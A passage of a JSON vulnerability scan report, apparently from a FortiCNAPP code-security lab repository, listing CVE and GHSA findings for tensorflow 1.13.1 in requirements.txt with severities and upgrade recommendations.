            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23586 (severity: medium, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23586](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23586)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "b01eb682657460a8740cfb64ecc91539385908fe"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "GHSA-43q8-3fv7-pr5x",
          "ruleIndex": 319,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability GHSA-43q8-3fv7-pr5x (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [GHSA-43q8-3fv7-pr5x](https://github.com/advisories/GHSA-43q8-3fv7-pr5x)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "fde7c7f8b4064ffe7d3a278f832cb3631981830f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23595",
          "ruleIndex": 320,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23595 (severity: medium, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23595](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23595)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "8868604d56010b9618feaa8fab4ae6f3c32d1295"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21733",
          "ruleIndex": 321,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21733 (severity: medium, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21733](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21733)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "53509fa952fe8322075472d9841402382496c4a7"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29196",
          "ruleIndex": 322,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29196 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29196](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29196)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0c94fbad7ab36a08ff25ddb7bda28f8c4568915d"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29207",
          "ruleIndex": 323,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29207 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29207](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29207)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5a35898a1908030cf33f0132820170ab361d71d9"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29209",
          "ruleIndex": 324,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29209 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29209](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29209)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "bf5465b238ecada8f222a552f4df2698f25fe488"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29195",
          "ruleIndex": 325,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29195 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29195)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "584f01e9cdf0611e649b3ed339ef4697ccacaa83"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29193",
          "ruleIndex": 326,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29193 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29193](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29193)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7fdcf5af1e7ccbe1ca1a541ffd9223045a91cffe"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29216",
          "ruleIndex": 327,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29216 (severity: high, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29216](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29216)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ae8be18cd1e57682956aca38c8b8c14bfaa5657a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29191",
          "ruleIndex": 328,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29191 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29191](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29191)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ed2a22180c328231437c057b4f03b3ed020aee4e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29203",
          "ruleIndex": 329,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29203 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29203](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29203)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ecbdd1520004ab0ef830d40f39ee57816aa19cf9"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29197",
          "ruleIndex": 330,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29197 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29197](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29197)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "166f55d779b7ec414b1232251f68229fd1a5fb95"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29198",
          "ruleIndex": 331,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29198 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29198](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29198)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "20f3255cecbf64f9614977493bfe1dd7e367c7ea"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29206",
          "ruleIndex": 332,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29206 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29206](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29206)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "78fa2f764181afbc249f139469ed495e2e0a071d"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29213",
          "ruleIndex": 333,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-29213 (severity: medium, fixed in 2.8.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-29213](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29213)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c7416bd296abc0d7a98127992d611ee8e515cb95"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-29212",
          "ruleIndex": 334,
          "level": "warning",
          "message": {
